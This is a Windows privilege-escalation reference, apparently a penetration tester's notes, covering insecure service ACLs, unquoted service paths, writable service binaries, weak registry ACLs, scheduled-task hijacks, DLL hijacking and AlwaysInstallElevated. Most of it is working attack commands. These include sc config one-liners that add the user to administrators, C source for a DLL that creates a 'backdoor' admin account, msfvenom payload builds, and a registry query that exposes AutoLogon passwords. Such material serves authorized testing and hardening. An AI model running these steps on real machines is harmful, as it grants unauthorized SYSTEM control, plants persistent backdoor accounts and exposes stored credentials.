# Windows Service, Registry, Scheduled Task & DLL Misconfigurations

Deep reference for the "config" class of Windows privesc: insecure service permissions, unquoted service paths, writable service binaries, weak service-registry ACLs, scheduled-task hijacks, DLL hijacking, and installer/autorun abuse. Companion to `windows-privesc-methodology.md`.

> Tooling note: `accesschk.exe` (Sysinternals) is the workhorse for ACL checks. Always pass `-accepteula`. PowerUp automates most of this — but verify before acting.

---

## 1. Service Misconfigurations

A Windows service usually runs as `LocalSystem`. Five distinct misconfigs let you turn control of the service into SYSTEM execution.

### 1.1 Enumerate
```powershell
# Services with non-Windows binary paths (most likely vulnerable)
Get-CimInstance win32_service | Select Name,DisplayName,State,StartName,PathName |
  Where-Object {$_.PathName -notlike 'C:\Windows\*'} | Format-Table -Auto

# sc.exe details
sc.exe query state= all
sc.exe qc <ServiceName>          # binary path, start type, account
sc.exe sdshow <ServiceName>      # service DACL (SDDL)
```
```cmd
:: wmic (legacy, still handy)
wmic service get Name,PathName,StartName,StartMode
```

### 1.2 Insecure service ACL (you can reconfigure the service)
If your principal has `SERVICE_CHANGE_CONFIG`, `WRITE_DAC`, `WRITE_OWNER`, or `SERVICE_ALL_ACCESS`, you can repoint `binPath`.
```cmd
:: Find services you can modify
accesschk.exe -accepteula -uwcqv "Authenticated Users" *
accesschk.exe -accepteula -uwcqv %USERNAME% *
accesschk.exe -accepteula -uwcqv "Everyone" *
```
```powershell
Get-ModifiableService                # PowerUp: services you can reconfigure
```
Exploit:
```cmd
sc config <Svc> binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators %USERNAME% /add" start= auto
sc stop <Svc>
sc start <Svc>
:: (service "start" will appear to fail — the command still executes as SYSTEM)
:: restore afterwards:
sc config <Svc> binPath= "<original path>"
```
PowerUp one-liner:
```powershell
Invoke-ServiceAbuse -Name '<Svc>' -UserName "$env:USERDOMAIN\$env:USERNAME"
```

### 1.3 Writable service binary (replace the EXE)
```cmd
:: Check the binary file DACL
icacls "C:\Program Files\App\service.exe"
accesschk.exe -accepteula -quvw "C:\Program Files\App\service.exe"
```
```powershell
Get-ModifiableServiceFile            # PowerUp
```
Exploit: back up the original, drop your payload as the service exe, restart (or wait for reboot).
```cmd
copy "C:\Program Files\App\service.exe" %TEMP%\service.exe.bak
copy /y add_admin.exe "C:\Program Files\App\service.exe"
sc stop <Svc> & sc start <Svc>     :: or:  shutdown /r /t 0  (if you can reboot)
```

### 1.4 Unquoted service path
If `PathName` contains spaces and is unquoted, Windows tries each space-delimited prefix + `.exe`. Plant a binary at an earlier-resolving, writable location.
```cmd
:: Find unquoted paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
```powershell
Get-UnquotedService                  # PowerUp
```
Example: `C:\Program Files\Vuln App\service.exe` (unquoted) → Windows tries `C:\Program.exe`, then `C:\Program Files\Vuln.exe`. If you can write `C:\Program Files\` or `C:\`:
```cmd
icacls "C:\Program Files\Vuln App\"
copy add_admin.exe "C:\Program Files\Vuln.exe"
sc stop <Svc> & sc start <Svc>
```
```powershell
Write-ServiceBinary -Name '<Svc>' -Path 'C:\Program Files\Vuln.exe'   # PowerUp helper
```

### 1.5 Weak service-registry ACL (write to ImagePath)
Even if the service binary/DACL is fine, a weak ACL on `HKLM\SYSTEM\CurrentControlSet\Services\<Svc>` lets you change `ImagePath`.
```cmd
accesschk.exe -accepteula -kvuqsw "Authenticated Users" hklm\System\CurrentControlSet\Services
reg add HKLM\System\CurrentControlSet\Services\<Svc> /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\add_admin.exe" /f
sc start <Svc>
```

---

## 2. Scheduled Tasks

```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName \"Run As User\" \"Task To Run\" \"Schedule Type\""
Get-ScheduledTask | ? State -eq Ready | Select TaskName,@{n='User';e={$_.Principal.UserId}},@{n='Action';e={$_.Actions.Execute}}
```
For a task that runs as SYSTEM/admin, check write access to its action target:
```powershell
icacls "C:\Scripts\maintenance.ps1"
Get-ModifiableScheduledTaskFile      # PowerUp
```
Exploit: overwrite the script/exe with your payload, then wait for the trigger or force a run if you have rights:
```cmd
echo net localgroup administrators %USERNAME% /add >> C:\Scripts\maintenance.bat
schtasks /run /tn "<TaskName>"       :: if permitted
```

---

## 3. DLL Hijacking & Proxying

A privileged process that loads a DLL from a writable directory (or by missing-name search order) can be hijacked.

### 3.1 Find candidates
- Use **Procmon** (Sysinternals): filter `Result is NAME NOT FOUND` and `Path ends with .dll` while a SYSTEM/admin process starts. Each NAME NOT FOUND in a writable dir is a hijack.
- Check writable dirs in the DLL search path (app dir → System32 → SysWOW64 → `%PATH%`):
```powershell
$env:PATH -split ';' | % { if (Test-Path $_) { icacls $_ 2>$null } } | findstr /i "Everyone Users (M) (F) (W)"
Find-PathDLLHijack                   # PowerUp: writable PATH dirs
```

### 3.2 Build the malicious DLL
```c
// hijack.cpp
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r){
  if (reason == DLL_PROCESS_ATTACH){
    system("net user backdoor P@ssw0rd123! /add");
    system("net localgroup administrators backdoor /add");
  }
  return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc -shared -o legit.dll hijack.cpp   # name it the DLL being searched for
msfvenom -p windows/x64/exec CMD='...' -f dll -o legit.dll
```
**DLL proxying** (keep app working by forwarding exports to the real DLL) avoids crashing the host process — use `SharpDllProxy`/`DLLirium` to generate forwarders.

---

## 4. Installer & AutoRun Vectors

### 4.1 AlwaysInstallElevated (MSI runs as SYSTEM)
Both keys must be `1`:
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```powershell
Get-RegistryAlwaysInstallElevated    # PowerUp
```
Exploit:
```bash
msfvenom -p windows/x64/exec CMD='net localgroup administrators u /add' -f msi -o evil.msi
```
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```
PowerUp: `Write-UserAddMSI`.

### 4.2 AutoLogon credentials
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword DefaultDomainName AutoAdminLogon"
```
```powershell
Get-RegistryAutoLogon                 # PowerUp
```

### 4.3 Run / RunOnce / Startup with writable targets
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
icacls "C:\path\to\autorun.exe"        :: writable? replace it; runs at next logon
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

---

## 5. Cheatsheet

```cmd
:: SERVICES
accesschk.exe -accepteula -uwcqv "Authenticated Users" *
sc qc <Svc> & sc sdshow <Svc>
sc config <Svc> binPath= "cmd /c net localgroup administrators %USERNAME% /add" & sc stop <Svc> & sc start <Svc>

:: UNQUOTED
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: SERVICE REGISTRY
accesschk.exe -accepteula -kvuqsw "Authenticated Users" hklm\System\CurrentControlSet\Services

:: SCHEDULED TASKS
schtasks /query /fo LIST /v | findstr /i "TaskName Run"

:: DLL HIJACK (writable PATH dirs)
:: Procmon -> NAME NOT FOUND .dll ; plant DLL

:: ALWAYSINSTALLELEVATED
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi

:: AUTOLOGON
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

PowerUp fast pass:
```powershell
. .\PowerUp.ps1; Invoke-AllChecks | Out-File pu.txt
```

---

## References

- HackTricks – Windows Local Privilege Escalation (services/registry) — https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PowerUp — https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- accesschk (Sysinternals) — https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
- HackTricks – DLL Hijacking — https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
- SharpDllProxy — https://github.com/Flangvik/SharpDllProxy
- itm4n – AlwaysInstallElevated / service misconfig writeups — https://itm4n.github.io/
